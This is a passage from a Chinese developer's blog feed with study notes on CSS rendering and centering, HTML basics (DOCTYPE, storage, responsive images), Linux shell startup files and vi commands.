<code>rotate</code>，<code>scale3d</code> 与 <code>scale</code> 等等也都是一样的，<code>3d</code> 会启用 <code>GPU</code> 加速。</p><p><strong>但是需要注意的是，虽然 <code>2d</code> 不会触发 <code>GUP</code> 硬件加速也就是增加新的合成层，但是它和 <code>3d</code> 一样能跳过浏览器渲染的 <code>Layout</code> 和 <code>Paint</code> 步骤，而直接到 <code>Composite</code>(合成) 步骤，实际上是新增了一层渲染层，所以一定程度上渲染性能也有提升</strong>。渲染步骤：<code>JS</code> -&gt; <code>Style</code> -&gt; <code>Layout</code> -&gt; <code>Paint</code> -&gt; <code>Composite</code>，关于 <code>CSS</code> 属性会触发哪个步骤可以查看 <a href="https://csstriggers.com" target="_blank" rel="noopener">CSS Triggers</a>。</p><p>先有的渲染层才有合成层。</p><p>关于合成层与渲染层、<code>GPU</code> 硬件加速可以看 <a href="http://taobaofed.org/blog/2016/04/25/performance-composite/" target="_blank" rel="noopener">无线性能优化：Composite</a>。</p><blockquote><p><code>GPU</code> 是使用浮点数运算的，故而如果对文字加速可能会导致文字模糊，故而慎用！启动 <code>GPU</code> 加速自然也会加大电能的消耗，所以只在必要的时候再启用。</p></blockquote><blockquote><p>如何查看是否多了一层合成层(<strong>注意不是渲染层</strong>)，可以使用 <code>Chrome</code> 的 <code>Devtools</code> 来查看，选中更多种的 <code>Rendering</code> 选项，下面就有几个属性了：</p><ul><li><code>Paint flashing</code>:需要重绘的部分会高亮显示。</li><li><code>Layer borders</code>:显示层的边界，可以用来查看是否启用了 <code>GPU</code> 加速。</li><li><code>FPS meter</code>:启用 <code>FPS</code> 计量，可以在右上角看到当前页面的刷新帧率。</li><li><code>Scrolling performance issues</code>:会高亮可能影响滚动性能的元素。</li><li><code>Emulate CSS media</code>:强制使用打印或普通屏效果。<br>更加详细的信息可以通过 <code>Layers</code> 来查看，还会告诉你产生合成层的原因。以前的 <code>Chrome</code> 版本还可以在 <code>Timeline</code> 中看到每一帧的合成层情况，现在被移动到 <code>Performance</code> 中了，需要点击到某一个具体帧，再 <code>show layers</code> 才能出现 <code>Layers</code> 的选项卡。</li></ul></blockquote><h2 id="垂直水平居中"><a href="#垂直水平居中" class="headerlink" title="垂直水平居中"></a>垂直水平居中</h2><h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><ol><li>行内元素居中<br>行内元素居中是只针对行内元素的，比如文本（<code>text</code>）、图片（<code>img</code>）、按钮等行内元素，可通过给父元素设置 <code>text-align:center</code> 来实现。</li><li>块状元素居中<br>定宽块状元素居中:设置“左右 margin”值为“auto”来实现居中。<br>不定宽块状元素居中:a. <code>dispaly:table</code> 再设置“左右 margin”为”auto”。b. <code>position: relative; left: 50%; transform: tranlateX(-50%)</code>。</li><li>通用：<code>flex</code> 布局。</li></ol><h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><ol><li>父元素高度确定，且子元素只有单行文本<br>设置子元素的 <code>line-height</code> 等于父元素的 <code>height</code> 值。</li><li>父元素高度确定，子元素有多行<br>设置父元素 <code>dispaly:table-cell</code>，再设置父元素的 <code>vertical-align:middle</code>。</li><li>绝对定位 + <code>translate</code>：<code>position: absolute; top: 50%; transform: translateY(-50%)</code>。</li><li>绝对定位 + <code>margin: auto</code>:子元素设置 <code>position: absolute</code>，把要垂直居中的元素相对于父元素绝对定位，<code>top</code> 和 <code>bottom</code> 设为相等的值，再设置 <code>margin: 0 auto</code>。</li><li><code>padding</code>: 父元素没有高度，且只有一个子元素，那么设置父元素上下 <code>padding</code> 相等就可以了。</li><li><code>flex</code> 布局。</li><li><code>vertical-align</code>: 让行内元素在块级元素中垂直居中可以使用 <code>vertical-align:middle</code> 来近似居中，如果需要绝对居中同时需要设置父元素的 <code>font-size</code> 为 0。</li></ol><blockquote><p><code>vertical-align</code> 注意事项：默认情况图片是与父元素的基线对齐的，基线可以认为是英文 4 行线的第 3 行线，解决图片下方空白问题可以设置对齐方式除 <code>baseline</code> 之外的值，或者设置 <code>line-height</code> 或 <code>font-size</code> 为 0。字符有下沉特性(字符的中心比块的绝对中心稍微下移)，进行居中对齐时需要注意，居中元素的中线会与文字中线对齐，所以会稍微下移。</p></blockquote><blockquote><p>一个没有内容的 <code>inline-block</code> 元素的基线是 <code>margin</code> 边的下边缘(是包含了 <code>margin</code> 空间的)。</p></blockquote><p>直接使用 <code>vertical-align:middle</code> 来居中(父元素不设置行高或者字体大小)的问题可以看下面这张图：</p><p><img src="/assets/img/vertical-align.jpg" alt="vertical-align"></p><blockquote><p><code>vertical-align</code> 的值查看 <a href="https://www.zhangxinxu.com/wordpress/2010/05/我对css-vertical-align的一些理解与认识（一）/" target="_blank" rel="noopener">我对 css-vertical-align 的一些理解与认识（一）</a></p></blockquote><h2 id="长宽比固定"><a href="#长宽比固定" class="headerlink" title="长宽比固定"></a>长宽比固定</h2><ul><li>垂直方向的 <code>padding</code><br>高度设置为 0，然后 <code>padding-top</code> 或者 <code>padding-bottom</code> 设置百分比(这个百分比是宽度的百分比)来达到长宽比固定的效果，不过子元素需要绝对定位，不然会被 <code>padding</code> 挤出容器外。</li><li>视窗单位<br><code>CSS</code> 新特性中提供了一种新的单位 <code>vw</code>。了解过这个单位的同学都知道，浏览器 <code>100vw</code> 表示的就是浏览器的视窗宽度(Viewport)。那么只要宽高设置好比例的 <code>vw</code> 就可以了。</li><li><code>grid</code> 布局<br>不常用。</li></ul><h2 id="强制同步布局"><a href="#强制同步布局" class="headerlink" title="强制同步布局"></a>强制同步布局</h2><p>将一帧送到屏幕会采用如下顺序：</p><p><code>JavaScript</code> -&gt; <code>Style</code> -&gt; <code>Layout</code> -&gt; <code>Paint</code> -&gt; <code>Composite</code></p><p>首先 <code>JavaScript</code> 运行，然后计算样式，然后布局。但是，可以使用 <code>JavaScript</code> 强制浏览器提前执行布局。这被称为<strong>强制同步布局</strong>。</p><p>典型的情况就是，在读操作之前进行了写操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logBoxHeight</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  box.classList.add(<span class="string">'super-big'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Gets the height of the box in pixels</span></span><br><span class="line">  <span class="comment">// and logs it out.</span></span><br><span class="line">  <span class="built_in">console</span>.log(box.offsetHeight)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这里只要用上一帧的 offsetHeight 就可以了，取完值再对页面进行更新或者所谓的动画</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了回答高度问题，浏览器必须先应用样式更改（由于增加了 <code>super-big</code> 类），然后运行布局。这时它才能返回正确的高度。这是不必要的，并且可能是开销很大的工作。</p><p>这里有个强制同步布局的例子：<a href="https://googlesamples.github.io/web-fundamentals/tools/chrome-devtools/rendering-tools/forcedsync.html" target="_blank" rel="noopener">演示</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// animation loop</span></span><br><span class="line"><span class="comment">/* // [START forcedsync] */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">timestamp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0</span>; m &lt; movers.length; m++) &#123;</span><br><span class="line">    movers[m].style.left =</span><br><span class="line">      (<span class="built_in">Math</span>.sin(movers[m].offsetTop + timestamp / <span class="number">1000</span>) + <span class="number">1</span>) * <span class="number">500</span> + <span class="string">'px'</span></span><br><span class="line">    <span class="comment">// movers[m].style.left = ((Math.sin(m + timestamp/1000)+1) * 500) + 'px';</span></span><br><span class="line">  &#125;</span><br><span class="line">  raf = <span class="built_in">window</span>.requestAnimationFrame(update)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码中，在 <code>requestAnimationFrame</code> 的回调函数中，每个 <code>mover</code> 都触发了一次强制同步布局，所以本该在一帧内只布局一次，却在上面代码中布局了 <code>movers.length</code> 次，造成了卡顿。</p><blockquote><p>在 <code>Chrome DevTools</code> 中还可以诊断 <strong>强制同步布局</strong>。打开 <code>Performance</code> 面板(老版本是 <code>Timeline</code> 面板)，开始记录，结束之后可以查看 <code>FPS</code> 较低的帧，看问题在哪，可以看到在调用栈中，某个函数耗时较长，而且如果触发了强制同步布局，鼠标移动到上面去会有个 <code>Forced reflow</code> 提示，可能存在性能瓶颈，接在点击该执行函数就可以看到在哪触发的强制同步布局。具体 <code>Chrome DevTools</code> 如何操作查看 <a href="https://developers.google.com/web/tools/chrome-devtools/evaluate-performance/" target="_blank" rel="noopener">Get Started With Analyzing Runtime Performance</a>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS-选择器的优先级&quot;&gt;&lt;a href=&quot;#CSS-选择器的优先级&quot; class=&quot;headerlink&quot; title=&quot;CSS 选择器的优先级&quot;&gt;&lt;/a&gt;CSS 选择器的优先级&lt;/h2&gt;&lt;p&gt;内联样式 &amp;gt; &lt;code&gt;ID&lt;/code&gt; 选择器 &amp;gt; 类选择器、属性选择器和伪类选择器(&lt;code&gt;:hover&lt;/code&gt;,&lt;code&gt;:first-child&lt;/code&gt;，&lt;code&gt;:after&lt;/code&gt; 之类) &amp;gt; 标签（类型）选择器和伪元素选择器(&lt;code&gt;::after&lt;/code&gt;,&lt;code&gt;::first-letter&lt;/code&gt;,&lt;code&gt;::selection&lt;/code&gt;等等)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CSS2&lt;/code&gt; 用的是 &lt;code&gt;:after&lt;/code&gt;，而 &lt;code&gt;CSS3&lt;/code&gt; 用的是 &lt;code&gt;::after&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相同则比较数量每一级的数量总和。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="CSS" scheme="http://1016990109.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之HTML</title>
    <link href="http://1016990109.github.io/2018/09/04/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BHTML/"/>
    <id>http://1016990109.github.io/2018/09/04/前端基础之HTML/</id>
    <published>2018-09-04T03:29:55.000Z</published>
    <updated>2018-09-05T13:05:35.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DOCTYPE"><a href="#DOCTYPE" class="headerlink" title="DOCTYPE"></a>DOCTYPE</h2><p><code>DOCTYPE</code> 是用来声明文档类型和 <code>DTD</code> 规范的，一个主要的用途便是文件的合法性验证。如果文件代码不合法，那么浏览器解析时便会出一些差错。<code>HTML</code> 编辑器通常也会在语法高亮的同时提供合法性验证。</p><p>通常有以下几种：</p><ul><li><p>HTML5(推荐使用，其他的有触发怪异模式和近标准模式的风险)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li><p>HTML 4.01 Strict</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>HTML 4.01 Transitional</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>上面的类型浏览器都会以标准模式渲染，除了下面这些情况（这些情况浏览器会进入兼容模式，也称怪异模式）：</p><ul><li><code>DOCTYPE</code> 声明了 <code>Transitional DTD</code> 但未给出 <code>URI</code></li><li><code>DOCTYPE</code> 声明不合法</li><li>未给出 <code>DOCTYPE</code> 声明</li></ul><blockquote><p>确定把 <code>DOCTYPE</code> 正确地放在 <code>HTML</code> 文件的顶端。任何放在 <code>DOCTYPE</code> 前面的东西，比如批注或 <code>XML</code> 声明，会令 <code>Internet Explorer 9</code> 或更早期的浏览器触发怪异模式。</p></blockquote><h2 id="标准模式和怪异模式的区别"><a href="#标准模式和怪异模式的区别" class="headerlink" title="标准模式和怪异模式的区别"></a>标准模式和怪异模式的区别</h2><ul><li><p>盒模型的处理差异<br>标准 <code>CSS</code> 盒模型的宽度和高度等于内容区的高度和宽度，不包含内边距和边框，而 <code>IE6</code> 之前的浏览器实现的盒模型的宽高计算方式是包含内边距和边框的。因此，对于 <code>IE</code>，怪异模式和标准模式下的盒模型宽高计算方式是不一样的；</p></li><li><p>行内元素的垂直对齐<br>很多早期的浏览器对齐图片至包含它们的盒子的下边框，虽然 <code>CSS</code> 的规范要求它们被对齐至盒内文本的基线。标准模式下，基于 <code>Gecko</code> 的浏览器将会对齐至基线，而在 <code>quirks</code> 模式下它们会对齐至底部。最直接的例子就是图片的显示。在标准模式下，图片并不是与父元素的下边框对齐的，如果仔细观察，你会发现图片与父元素下边框之间存在一点小空隙。那是因为标准模式下，图片是基线对齐的。而怪异模式下，则不存在这个问题。具体请看这篇文章 <a href="https://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/" target="_blank" rel="noopener">CSS 深入理解 vertical-align 和 line-height 的基友关系</a>。</p></li></ul><h2 id="多语言"><a href="#多语言" class="headerlink" title="多语言"></a>多语言</h2><p>当客户端向服务器发送 <code>HTTP</code> 请求时，通常会发送有关语言首选项的信息，比如使用 <code>Accept-Language</code> 请求头。如果替换语言存在，服务器可以利用该信息返回与之相匹配的 <code>HTML</code> 文档。返回的 <code>HTML</code> 文档还应在 <code>&lt;html&gt;</code> 标签中声明 <code>lang</code> 属性，比如 <code>&lt;html lang=&quot;en&quot;&gt;...&lt;/html&gt;</code>。</p><h2 id="HTML5-的基本构件"><a href="#HTML5-的基本构件" class="headerlink" title="HTML5 的基本构件"></a>HTML5 的基本构件</h2><ul><li>语义 - 提供更准确地描述内容。</li><li>连接 - 提供新的方式与服务器通信。</li><li>离线和存储 - 允许网页在本地存储数据并有效地离线运行。</li><li>多媒体 - 在 <code>Open Web</code> 中，视频和音频被视为一等公民（<code>first-class citizens</code>）。</li><li>2D/3D 图形和特效 - 提供更多种演示选项。</li><li>性能和集成 - 提供更快的访问速度和性能更好的计算机硬件。</li><li>设备访问 - 允许使用各种输入、输出设备。</li><li>外观 - 可以开发丰富的主题。</li></ul><h2 id="cookie、sessionStorage-和-localStorage-的区别"><a href="#cookie、sessionStorage-和-localStorage-的区别" class="headerlink" title="cookie、sessionStorage 和 localStorage 的区别"></a>cookie、sessionStorage 和 localStorage 的区别</h2><table><thead><tr><th></th><th>cookie</th><th>localStorage</th><th>sessionStorage</th></tr></thead><tbody><tr><td>由谁初始化</td><td>客户端或服务器，服务器可以使用 Set-Cookie 响应头。</td><td>客户端</td><td>客户端</td></tr><tr><td>过期时间</td><td>手动设置</td><td>永不过期</td><td>当前页面关闭时</td></tr><tr><td>在当前浏览器会话（<code>browser sessions</code>）中是否保持不变</td><td>取决于是否设置了过期时间</td><td>是</td><td>否</td></tr><tr><td>是否随着每个 <code>HTTP</code> 请求发送给服务器</td><td>是，<code>Cookies</code> 会通过 <code>Cookie</code> 请求头，自动发送给服务器</td><td>否</td><td>否</td></tr><tr><td>容量（每个域名，每个域名都有单独的存储）</td><td>4kb</td><td>5MB</td><td>5MB</td></tr><tr><td>访问权限</td><td>任意窗口</td><td>任意窗口</td><td>当前页面窗口</td></tr></tbody></table><h2 id="渐进式渲染"><a href="#渐进式渲染" class="headerlink" title="渐进式渲染"></a>渐进式渲染</h2><ul><li>图片懒加载——页面上的图片不会一次性全部加载。当用户滚动页面到图片部分时，<code>JavaScript</code> 将加载并显示图像。</li><li>确定显示内容的优先级（分层次渲染）——为了尽快将页面呈现给用户，页面只包含基本的最少量的 <code>CSS</code>、脚本和内容，然后可以使用延迟加载脚本或监听 <code>DOMContentLoaded/load</code> 事件加载其他资源和内容。</li><li>异步加载 <code>HTML</code> 片段——当页面通过后台渲染时，把 <code>HTML</code> 拆分，通过异步请求，分块发送给浏览器。</li></ul><h2 id="响应式图片"><a href="#响应式图片" class="headerlink" title="响应式图片"></a>响应式图片</h2><p>设计响应式图片时我们可以使用两个新的属性 —— <code>srcset</code> 和 <code>sizes</code> —— 来提供更多额外的资源图像和提示，帮助浏览器选择正确的一个资源。</p><p><code>srcset</code> 定义了我们允许浏览器选择的图像集，以及每个图像的大小。</p><p><code>sizes</code> 定义了一组媒体条件（例如屏幕宽度）并且指明当某些媒体条件为真时，什么样的图片尺寸是最佳选择。</p><p>所以，有了这些属性，浏览器会：</p><ol><li>查看设备宽度</li><li>检查 <code>sizes</code> 列表中哪个媒体条件是第一个为真</li><li>查看给予该媒体查询的槽大小</li><li>加载 <code>srcset</code> 列表中引用的最接近所选的槽大小的图像</li></ol><p>更加具体的使用方式可以查看 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images" target="_blank" rel="noopener">响应式图片</a></p><h2 id="HTML-与-XHTML-的区别"><a href="#HTML-与-XHTML-的区别" class="headerlink" title="HTML 与 XHTML 的区别"></a>HTML 与 XHTML 的区别</h2><p><code>HTML</code>:</p><ul><li>元素不一定有起始的标签</li><li>元素不一定有结束的标签</li><li>空元素才可以自关闭，如 <code>br</code>、<code>img</code></li><li>标签和属性大小写<strong>不敏感</strong></li><li>属性可以不用双引号</li><li>某些属性可以为空，如 <code>disabled</code>、<code>checked</code></li><li>特殊符号不需要转义</li><li>文档必须包含 <code>HTML5</code> 的 <code>DOCTYPE</code></li></ul><p><code>XHTML</code>:</p><ul><li>所有元素都必须有起始标签</li><li>非空元素如果有起始标签则必须同时有结束标签</li><li>自关闭的元素一定要使用 <code>/&gt;</code></li><li>属性大小写敏感，一般来说都是小写</li><li>属性必须使用双引号引起来</li><li>禁止空属性，必须有值，如 <code>checked=&quot;checked&quot;</code></li><li>特殊符号需要转义</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;DOCTYPE&quot;&gt;&lt;a href=&quot;#DOCTYPE&quot; class=&quot;headerlink&quot; title=&quot;DOCTYPE&quot;&gt;&lt;/a&gt;DOCTYPE&lt;/h2&gt;&lt;p&gt;&lt;code&gt;DOCTYPE&lt;/code&gt; 是用来声明文档类型和 &lt;code&gt;DTD&lt;/code&gt; 规范的，一个主要的用途便是文件的合法性验证。如果文件代码不合法，那么浏览器解析时便会出一些差错。&lt;code&gt;HTML&lt;/code&gt; 编辑器通常也会在语法高亮的同时提供合法性验证。&lt;/p&gt;
&lt;p&gt;通常有以下几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;HTML5(推荐使用，其他的有触发怪异模式和近标准模式的风险)&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="HTML" scheme="http://1016990109.github.io/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>Linux 命令 —— 配置文件和 Shell 环境</title>
    <link href="http://1016990109.github.io/2018/08/21/Linux-%E5%91%BD%E4%BB%A4-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%92%8CShell%E7%8E%AF%E5%A2%83/"/>
    <id>http://1016990109.github.io/2018/08/21/Linux-命令-配置文件和Shell环境/</id>
    <published>2018-08-21T11:31:51.000Z</published>
    <updated>2018-08-24T03:24:06.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shell-环境"><a href="#Shell-环境" class="headerlink" title="Shell 环境"></a>Shell 环境</h2><p><code>shell</code> 在环境中存储了两种基本类型的数据，虽然 <code>bash</code> 几乎无法分辨这些数据的类型。它们是环境变量和 <code>shell</code> 变量。</p><a id="more"></a><h3 id="检查环境变量"><a href="#检查环境变量" class="headerlink" title="检查环境变量"></a>检查环境变量</h3><p><code>set</code> 显示 <code>shell</code> 变量、<code>shell</code> 函数和环境变量，<code>printenv</code> 只显示环境变量。<code>printenv [name]</code> 还能输出变量的值(当然常用的还是 <code>echo $[name]</code>)。而别名只能通过 <code>alias</code> 来查看。</p><h3 id="建立-shell-环境"><a href="#建立-shell-环境" class="headerlink" title="建立 shell 环境"></a>建立 shell 环境</h3><p>当我们登录系统后，<code>bash</code> 程序启动，并且会读取一系列称为启动文件的配置脚本，这些文件定义了默认的可供所有用户共享的 <code>shell</code> 环境。然后是读取更多位于我们自己家目录中的启动文件，这些启动文件定义了用户个人的 <code>shell</code> 环境。确切的启动顺序依赖于要运行的 <code>shell</code> 会话类型。有两种 <code>shell</code> 会话类型：一个是登录 <code>shell</code> 会话，另一个是非登录 <code>shell</code> 会话。</p><p>登录 <code>shell</code> 会话会在其中提示用户输入用户名和密码；例如，我们启动一个虚拟控制台会话。非登录 <code>shell</code> 会话通常当我们在 <code>GUI</code> 下启动终端会话时出现。</p><p>退出命令：</p><ul><li>执行 <code>exit</code> 命令，退出一个 <code>shell</code>（登录或非登录 <code>shell</code>）；</li><li>执行 <code>logout</code> 命令，退出登录 <code>shell</code>（不能退出非登录 <code>shell</code>）。</li></ul><p>登录 <code>shell</code> 会读取一个或多个启动文件，如下表：</p><table><thead><tr><th>文件</th><th>内容</th></tr></thead><tbody><tr><td>/etc/profile</td><td>应用于所有用户的全局配置脚本。</td></tr><tr><td>~/.bash_profile</td><td>用户个人的启动文件。可以用来扩展或重写全局配置脚本中的设置。</td></tr><tr><td>~/.bash_login</td><td>如果文件 ~/.bash_profile 没有找到，bash 会尝试读取这个脚本。</td></tr><tr><td>~/.profile</td><td>如果文件 ~/.bash_profile 或文件 ~/.bash_login 都没有找到，bash 会试图读取这个文件。 这是基于 Debian 发行版的默认设置，比方说 Ubuntu。</td></tr></tbody></table><p>非登录 <code>shell</code> 会读取以下启动文件：</p><table><thead><tr><th>文件</th><th>内容</th></tr></thead><tbody><tr><td>/etc/bash.bashrc</td><td>应用于所有用户的全局配置文件。</td></tr><tr><td>~/.bashrc</td><td>用户个人的启动文件。可以用来扩展或重写全局配置脚本中的设置。</td></tr></tbody></table><p>除了读取以上启动文件之外，非登录 <code>shell</code> 会话也会继承它们父进程的环境设置，通常是一个登录 <code>shell</code>。</p><p>在普通用户看来，文件 <code>~/.bashrc</code> 可能是最重要的启动文件，因为它几乎总是被读取(每次执行 <code>shell</code> 脚本时都会重新读取)。非登录 <code>shell</code> 默认会读取它，并且大多数登录 <code>shell</code> 的启动文件也会能读取 <code>~/.bashrc</code> 文件。</p><h3 id="一个启动文件的内容"><a href="#一个启动文件的内容" class="headerlink" title="一个启动文件的内容"></a>一个启动文件的内容</h3><p>看一下典型的 <code>.bash_profile</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .bash_profile</span></span><br><span class="line"><span class="comment"># Get the aliases and functions</span></span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bashrc ]; <span class="keyword">then</span></span><br><span class="line">. ~/.bashrc</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># User specific environment and startup programs</span></span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>修改后使用 <code>source ***</code> 激活启动文件。</p><h2 id="vi-简介"><a href="#vi-简介" class="headerlink" title="vi 简介"></a>vi 简介</h2><p>第一版 <code>vi</code> 是在 1976 由 Bill Joy 写成的，当时他是加州大学伯克利分校的学生，后来他共同创建了 <code>Sun</code> 微系统公司。<code>vi</code> 这个名字来源于单词“visual”，因为它打算在带有可移动光标的视频终端上编辑文本。在发明可视化编辑器之前，有一次只能操作一行文本的行编辑器。为了编辑，我们需要告诉行编辑器到一个特殊行并且说明做什么修改，比方说添加或删除文本。视频终端（而不是基于打印机的终端，像电传打印机）的出现，使可视化编辑成为可能。<code>vi</code> 实际上整合了一个强大的行编辑器 ———— ex , 所以我们在使用 <code>vi</code> 时能运行行编辑命令。</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ul><li><p>按 <code>i</code> 进入插入模式。</p></li><li><p><code>:w</code> 保存。</p></li><li><p><code>u</code> 是 <code>undo</code>。</p></li><li><p><code>p</code> 粘贴到光标位置之后，<code>P</code> 粘贴到光标位置之前。</p></li><li><p>查找：<code>f</code> 命令能搜索一特定行，并将光标移动到下一个匹配的字符上。例如，命令 <code>fa</code> 会把光标定位到同一行中下一个出现的”a”字符上。在进行了一次行内搜索后，输入分号能重复这次搜索。<br>移动光标到下一个出现的单词或短语上，使用 <code>/</code> 命令。当你输入 <code>/</code> 命令后，一个”/”字符会出现在屏幕底部。接下来，输入要查找的单词或短语， 按下回车。光标就会移动到下一个包含所查找字符串的位置。通过 <code>n</code> 命令来重复先前的查找。</p></li><li><p>替换<br><code>vi</code> 使用 <code>ex</code> 命令来执行查找和替代操作（<code>vi</code> 中叫做“替换”）。将整个文件中的单词“Line”更改为“line”， 输入以下命令(后面再加个 <code>c</code> 则每次替换会提醒用户确认)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:%s/Line/line/g</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>条目</th><th>含义</th></tr></thead><tbody><tr><td>:</td><td>冒号字符运行一个 <code>ex</code> 命令。</td></tr><tr><td>%</td><td>指定要操作的行数。% 是一个快捷方式，表示从第一行到最后一行。另外，操作范围也 可以用 1,5 来代替（因为我们的文件只有 5 行文本），或者用 1,$ 来代替，意思是 “ 从第一行到文件的最后一行。”如果省略了文本行的范围，那么操作只对当前行生效。</td></tr><tr><td>s</td><td>指定操作。在这种情况下是，替换（查找与替代）。</td></tr><tr><td>/Line/line</td><td>查找类型与替代文本。</td></tr><tr><td>g</td><td>这是“全局”的意思，意味着对文本行中所有匹配的字符串执行查找和替换操作。如果省略 g，则 只替换每个文本行中第一个匹配的字符串。</td></tr></tbody></table><ul><li>编辑多个文件<br><code>vi file1 file2 file3...</code> 打开多个文件。<br><code>:n</code> 切换到下一个文件。<br><code>:N</code> 切换到上一个文件。<br><code>:buffers</code> 列出文件缓冲，<code>:buffers 缓冲区编号</code> 切换到对应的文件。</li></ul><p>移动光标：</p><table><thead><tr><th>按键</th><th>移动光标</th></tr></thead><tbody><tr><td>l or 右箭头</td><td>向右移动一个字符</td></tr><tr><td>h or 左箭头</td><td>向左移动一个字符</td></tr><tr><td>j or 下箭头</td><td>向下移动一行</td></tr><tr><td>k or 上箭头</td><td>向上移动一行</td></tr><tr><td>0 (零按键)</td><td>移动到当前行的行首。</td></tr><tr><td>^</td><td>移动到当前行的第一个非空字符。</td></tr><tr><td>$</td><td>移动到当前行的末尾。</td></tr><tr><td>w</td><td>移动到下一个单词或标点符号的开头。</td></tr><tr><td>W</td><td>移动到下一个单词的开头，忽略标点符号。</td></tr><tr><td>b</td><td>移动到上一个单词或标点符号的开头。</td></tr><tr><td>B</td><td>移动到上一个单词的开头，忽略标点符号。</td></tr><tr><td>Ctrl-f or Page Down</td><td>向下翻一页</td></tr><tr><td>Ctrl-b or Page Up</td><td>向上翻一页</td></tr><tr><td>numberG</td><td>移动到第 number 行。例如，1G 移动到文件的第一行。</td></tr><tr><td>G</td><td>移动到文件末尾。</td></tr></tbody></table><p>文本删除命令(这个 <code>d</code> 